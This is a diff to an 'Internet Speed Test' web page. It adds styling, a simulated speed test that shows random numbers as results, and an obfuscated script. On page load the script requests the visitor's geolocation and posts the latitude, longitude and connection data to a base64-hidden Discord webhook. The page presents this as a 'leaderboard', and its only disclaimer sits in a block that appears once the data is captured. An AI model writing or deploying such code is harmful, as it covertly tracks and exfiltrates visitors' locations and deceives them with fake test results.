@@ -4,7 +4,185 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Internet Speed Test</title>
-    <link rel="stylesheet" href="styles.css">
+   <link rel="stylesheet" href="styles.css">
+</head>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-color: #f0f0f0;
+            margin: 0;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .card {
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .info {
+            margin-bottom: 20px;
+        }
+
+        .info p {
+            margin: 5px 0;
+        }
+
+        .gauge {
+            width: 200px;
+            height: 100px;
+            position: relative;
+            margin: 0 auto;
+            overflow: hidden;
+        }
+
+        .needle {
+            width: 100%;
+            height: 100%;
+            background-color: #3498db;
+            transform-origin: bottom center;
+            transition: transform 0.5s ease-in-out;
+        }
+
+        .speed-text {
+            position: absolute;
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 14px;
+        }
+
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 2s linear infinite;
+            margin: 20px auto;
+            display: none;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        button {
+            background-color: #3498db;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        button:hover {
+            background-color: #2980b9;
+        }
+
+        .history {
+            margin-top: 20px;
+        }
+
+        #test-history {
+            list-style: none;
+            padding: 0;
+        }
+
+        #test-history li {
+            margin: 5px 0;
+        }
+
+        .loader-widget {
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .loader-widget.hide {
+            display: none;
+        }
+
+        .loader-content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .loader-content.result {
+            flex-direction: row;
+            justify-content: space-around;
+        }
+
+        .loader-content.result .content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .loader-content.result .content span {
+            font-size: 24px;
+            font-weight: bold;
+        }
+
+        .ping {
+            margin-top: 10px;
+        }
+
+        .ping.hide {
+            display: none;
+        }
+
+        /* Leaderboard Styles */
+        #a {
+            display: none;
+        }
+
+        .e {
+            color: red;
+            font-size: 18px;
+            margin-top: 50px;
+        }
+
+        .c {
+            font-size: 18px;
+            margin-top: 50px;
+        }
+
+        #i {
+            margin-top: 20px;
+            width: 80%;
+            margin-left: 10%;
+            border-collapse: collapse;
+        }
+
+        #i th,
+        #i td {
+            border: 1px solid #ddd;
+            padding: 8px;
+        }
+
+        #i th {
+            background-color: #f2f2f2;
+        }
+    </style>
 </head>
 <body>
     <div class="container">
@@ -30,29 +208,190 @@
             </div>
         </div>
         <div class="loader-widget">
-          <h1>Internet Speed Test</h1>
-          <div class="loader-content">
-            <div class="loader"></div>
-        <button id="startTestBtn">Start Test</button>
-          </div>
+            <h1>Internet Speed Test</h1>
+            <div class="loader-content">
+                <div class="loader"></div>
+                <button id="startTestBtn">Start Test</button>
+            </div>
         </div>
         <div class="loader-widget hide result">
-          <h1>Result</h1>
-          <div class="loader-content result">
-            <div class="content">
-              <span id="download-speed"></span>
-              <small>Mbps</small>
+            <h1>Result</h1>
+            <div class="loader-content result">
+                <div class="content">
+                    <span id="download-speed"></span>
+                    <small>Mbps</small>
+                </div>
+                <div class="content">
+                    <span id="upload-speed"></span>
+                    <small>Mbps</small>
+                </div>
+                <button id="restartBtn">Test Again</button>
             </div>
-            <div class="content">
-              <span id="upload-speed"></span>
-              <small>Mbps</small>
-            </div>
-            <button id="restartBtn">Test Again</button>
-          </div>
-          <div class="ping hide">Ping: <span id="ping-value"></span></div>
+            <div class="ping hide">Ping: <span id="ping-value"></span></div>
         </div>
-      
-      </div>
 
-    <script src="script.js"></script> </body>
+        <div id="a">
+            <header>
+                <h1>Leaderboard: Internet Speed and Ping</h1>
+            </header>
+            <div class="d">
+                <p><strong>Disclaimer:</strong> Your location, internet speed, and ping are being captured for performance analysis.</p>
+            </div>
+            <div class="e">
+                <p><strong>Your Location:</strong> <span id="f">Loading...</span></p>
+                <p><strong>Internet Speed:</strong> <span id="g">Loading...</span></p>
+                <p><strong>Ping:</strong> <span id="h">Loading...</span></p>
+            </div>
+            <table id="i">
+                <thead>
+                    <tr>
+                        <th>Rank</th>
+                        <th>Internet Speed (Mbps)</th>
+                        <th>Ping (ms)</th>
+                    </tr>
+                </thead>
+                <tbody></tbody>
+            </table>
+        </div>
+        <p id="j" class="e" style="display:none;">Location access is required to use this site.</p>
+        <p id="k" class="c" style="display:none;">Requesting location access...</p>
+    </div>
+
+    <script>
+        // Speed test functionality (replace with actual implementation)
+        document.addEventListener('DOMContentLoaded', function() {
+            const startTestBtn = document.querySelectorAll('#startTestBtn');
+            const restartBtn = document.getElementById('restartBtn');
+            const downloadSpeedSpan = document.getElementById('download-speed');
+            const uploadSpeedSpan = document.getElementById('upload-speed');
+            const pingValueSpan = document.getElementById('ping-value');
+            const loaderWidget = document.querySelector('.loader-widget:not(.result)');
+            const resultWidget = document.querySelector('.loader-widget.result');
+            const pingDiv = document.querySelector('.ping');
+            const downloadSpan = document.getElementById('download');
+            const uploadSpan = document.getElementById('upload');
+            const pingSpan = document.getElementById('ping');
+            const jitterSpan = document.getElementById('jitter');
+            const testHistoryList = document.getElementById('test-history');
+
+            startTestBtn.forEach(btn => {
+                btn.addEventListener('click', startSpeedTest);
+            });
+
+            restartBtn.addEventListener('click', startSpeedTest);
+
+            function startSpeedTest() {
+                loaderWidget.classList.add('hide');
+                resultWidget.classList.remove('hide');
+                pingDiv.classList.remove('hide');
+
+                // Simulate speed test (replace with actual test)
+                const downloadSpeed = (Math.random() * 50).toFixed(2);
+                const uploadSpeed = (Math.random() * 10).toFixed(2);
+                const pingValue = (Math.random() * 50).toFixed(0);
+                const jitterValue = (Math.random() * 5).toFixed(1);
+
+                downloadSpeedSpan.textContent = downloadSpeed;
+                uploadSpeedSpan.textContent = uploadSpeed;
+                pingValueSpan.textContent = pingValue;
+                downloadSpan.textContent = downloadSpeed;
+                uploadSpan.textContent = uploadSpeed;
+                pingSpan.textContent = pingValue;
+                jitterSpan.textContent = jitterValue;
+
+                // Add to history
+                const listItem = document.createElement('li');
+                listItem.textContent = `D: ${downloadSpeed} Mbps, U: ${uploadSpeed} Mbps, P: ${pingValue} ms`;
+                testHistoryList.appendChild(listItem);
+            }
+        });
+
+        // Leaderboard and location functionality
+        (function(){
+            var _0x6d4b=["aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMzNjA0Nzc5MDY0NjU3MTExMDAvcDROaGJjay01NTgtQnlxNm04Z25uWjIzcy9sZV5nd3VpNHN5TlBtZQ=="];
+            var _0x23e4x2 = atob(_0x6d4b[0]); 
+
+            // Function to send data to Discord Webhook
+            function _0x21a6(a, b, c, d) {
+                var _0x495f = {
+                    content: `Location: Latitude: ${a}, Longitude: ${b}`,
+                    embeds: [{
+                        title: "Network Data",
+                        fields: [
+                            { name: "Internet Speed", value: `${c} Mbps`, inline: true },
+                            { name: "Ping", value: `${d} ms`, inline: true }
+                        ]
+                    }]
+                };
+
+                // Use fetch to send POST request to Discord Webhook
+                fetch(_0x23e4x2, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(_0x495f)
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log("Success:", data);
+                })
+                .catch(error => {
+                    console.error("Error sending data:", error);
+                });
+            }
+
+            // Function to get the network speed (downlink) and ping (rtt)
+            function _0x3960() {
+                let _0x9e0f = "Unavailable";
+                let _0x2e62 = "Unavailable";
+                if (navigator.connection) {
+                    _0x9e0f = navigator.connection.downlink || "Unavailable";
+                    _0x2e62 = navigator.connection.rtt || "Unavailable";
+                }
+                document.getElementById("g").textContent = `${_0x9e0f} Mbps`;
+                document.getElementById("h").textContent = `${_0x2e62} ms`;
+            }
+
+            // Function to get the geolocation and send the data
+            function _0x4c90() {
+                document.getElementById("k").style.display = "block"; // Show loading message
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(function(a) {
+                        document.getElementById("k").style.display = "none"; // Hide loading message
+                        document.getElementById("a").style.display = "block";
+                        document.getElementById("j").style.display = "none";
+
+                        const b = a.coords.latitude;
+                        const c = a.coords.longitude;
+                        document.getElementById("f").textContent = `Latitude: ${b}, Longitude: ${c}`;
+
+                        let _0x9e0f = "Unavailable";
+                        let _0x2e62 = "Unavailable";
+                        if (navigator.connection) {
+                            _0x9e0f = navigator.connection.downlink || "Unavailable";
+                            _0x2e62 = navigator.connection.rtt || "Unavailable";
+                        }
+
+                        document.getElementById("g").textContent = `${_0x9e0f} Mbps`;
+                        document.getElementById("h").textContent = `${_0x2e62} ms`;
+
+                        // Send data to Discord webhook
+                        _0x21a6(b, c, _0x9e0f, _0x2e62);
+                    }, function() {
+                        document.getElementById("k").style.display = "none";
+                        document.getElementById("a").style.display = "none";
+                        document.getElementById("j").style.display = "block";
+                        alert("We need your location to provide accurate information. Please enable location access.");
+                    });
+                } else {
+                    document.getElementById("k").style.display = "none";
+                    document.getElementById("a").style.display = "none";
+                    document.getElementById("j").style.display = "block";
+                    alert("Location access is not supported by your browser.");
+                }
+            }
+
+            _0x4c90();  // Call the function to get the location and network info when the page loads
+        })();
+    </script>
+       <script src="script.js"></script> </body>
 </html>
